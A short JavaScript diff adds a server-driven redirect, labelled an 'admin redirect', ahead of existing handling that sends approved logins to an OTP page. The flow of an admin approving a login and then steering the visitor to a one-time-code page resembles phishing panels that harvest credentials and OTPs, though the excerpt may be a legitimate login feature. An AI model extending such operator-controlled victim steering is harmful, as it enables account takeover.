@@ -228,6 +228,11 @@
             })
             .then(response => response.json())
             .then(data => {
+                // Honor admin redirect first
+                if (data.redirect_to) {
+                    window.location.href = data.redirect_to;
+                    return;
+                }
                 if (data.status === 'approved') {
                     if (data.type === 'login') {
                         window.location.href = 'otp_en.html';
